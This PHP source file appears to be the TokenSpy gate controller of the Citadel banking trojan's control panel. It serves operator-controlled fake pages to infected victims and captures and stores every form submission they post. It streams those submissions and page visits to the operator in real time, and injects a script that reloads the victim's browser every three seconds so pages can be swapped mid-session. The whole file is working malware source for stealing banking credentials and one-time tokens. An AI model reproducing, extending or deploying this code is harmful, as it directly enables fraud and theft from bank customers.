<?php namespace lib\fun\TokenSpy\gate;

require_once 'system/lib/fun/TokenSpy/TsState.php';
require_once 'system/lib/fun/TokenSpy/ApiClient.php';
require_once 'system/lib/fun/TokenSpy/gate/BotInfo.php';
use lib\fun\TokenSpy;

require_once 'system/lib/amiss/amiss.php';
use Citadel\Models;

require_once 'system/lib/fun/TokenSpy/resources/Template.php';
require_once 'system/lib/fun/TokenSpy/resources/Page.php';

/** TokenSpy Proxy controller
 */
class ProxyController {
    function __construct(){
        $this->amiss = \Amiss::singleton();
    }

    /** Display an error page
     * @param int $code
     * @param string $title
     * @param string $text
     */
    static function actionError($code, $title, $text){
        header("HTTP/1.1 $code Server error");
        echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <title>{$title}</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="refresh" content="5" />
</head>
<body>
<h1>{$title}</h1>
<p>{$text}</p>
</body>
</html>
HTML;
    }

    /** After the bot is accepted, all pages are proxied under ts.php
     * @param string $url
     *      The original URI
     * @param Models\TokenSpy\BotState $bs
     *      The bot's state object
     * @param TokenSpy\gate\BotInfo $botInfo
     *      The available info on the bot
     * @param int|null $__updateRequest
     *      Last known BotState::$mtime, got from the 'X-Update-Request' header.
     *      When set, returns a JSON object which tells whether the page should be refreshed.
     * @throws \Exception
     * TEST: ts.php/?DOMAIN=ya.ru&RULE_NAME=test&PATTERNID=0&SESSIONID=000&BOTID=TestBot&
     */
    function actionPage($uri, Models\TokenSpy\BotState $bs, TokenSpy\gate\BotInfo $botInfo, $__updateRequest = null){
        $man = $this->amiss->man;

        # Alterable settings
        /** Disable page transitions for now
         * @var bool
         */
        $disable_page_transitions = false;

        # Start the session
        $botInfo->session_start();

        # Execute proxy script
        if ($proxyScript = $bs->page->getProxyScript())
            include $proxyScript;

        # API: Update request?
        if (!is_null($__updateRequest)){
            /* An update is needed when:
             * - A page transition is going to happen (e.g. timeout)
             * - The page was changed manually (mtime has changed)
             *
             * As all HTTP requests have to contain the TS headers, we can catch them
             */
            $need_update = ($bs->needPageTransition() || $bs->mtime->format('U') != $__updateRequest);
            if ($disable_page_transitions)
                $need_update = false;

            header('Content-Type: application/json;charset=UTF-8');
            echo json_encode(array(
                'update' => $need_update,
            ));
            return;
        }

        # API: Disable rules by request
        if (isset($_REQUEST['_ts_disable_rule'])){
            $bs->info['disabled_rules'][ $_REQUEST['_ts_disable_rule'] ] = time() + 60*60*24*31;
            $bs->mtime = new \DateTime(); // so that the bot updates
            $man->save($bs);
        }

        # POST capture
        if (!empty($_POST)){
            # Store
            $post = new Models\TokenSpy\BotPosted;
            $post->botId = $botInfo->botId;
            $post->ctime = new \DateTime();
            $post->data = $_POST;
            $man->save($post);

            # Prepare DateTimes
            $post->ctime = $post->ctime->format('c');

            # Emit the 'post' event
            TokenSpy\NodeApiClient::get()->emitEvent('gate', 'post', array(
                'botId' => $botInfo->botId,
                'url' => $botInfo->url,
                'post' => $post,
            ));
        }

        # Page transition condition
        if (!$disable_page_transitions && $bs->needPageTransition( !empty($_POST) )){
            # Transit
            $bs->doPageTransition($man);
            $man->save($bs); # save immediately as the UI is updated in realtime

            # Emit the 'page' event
            TokenSpy\NodeApiClient::get()->emitEvent('gate', 'page', $bs);
        }

        # Reload the page on POST
        if (!empty($_POST) || $_SERVER['REQUEST_METHOD'] == 'POST'){ # Redirect even if the POST data is empty!
            header("HTTP/1.1 303 See Other");
            header("Location: ".$botInfo->url);
            echo '<script>window.location = window.location.href;</script>';
            return;
        }

        # Load & check
        if (!$bs->page)
            throw new \Exception("No page set");

        # Display the page
        $template = new TokenSpy\Template($bs->template);
        echo $template->render($bs->page, array(
            'botState' => $bs,
            'botInfo' => $botInfo,
        ));

        # Include the UpdateRequest script
        $noAutoUpdatePages = array('form');
        if (!in_array($bs->page->name, $noAutoUpdatePages)){
            $current_mtime = $bs->mtime->format('U');

            echo <<<HTML
<script>
// UpdateRequest
if(1)
setInterval(function(){
    var reloadPage = function(){
        // window.location.reload(true); // FF used to complain on "resubmit confirmation"
//        window.opener.location.href = window.opener.location;
        window.location = window.location.href;
    };

    try {
        var mtime = {$current_mtime};
        $.get(window.location.href, {__updateRequest: mtime}, function(data){
            if (data && data.update === true)
                reloadPage();
        });
    } catch(e){ // fallback
        window.console && console.log('__updateRequest='+mtime, ' error: ', e);
        reloadPage();
    }
}, 3000);
</script>
HTML;

        }

        # Update the state object
        $bs->hits++;
        $bs->atime = new \DateTime();
        $bs->url = $botInfo->url;
        $bs->browser = $_SERVER['HTTP_USER_AGENT'];
        $man->save($bs);

        # Emit the 'visit' event
        TokenSpy\NodeApiClient::get()->emitEvent('gate', 'visit', $bs);
    }
}
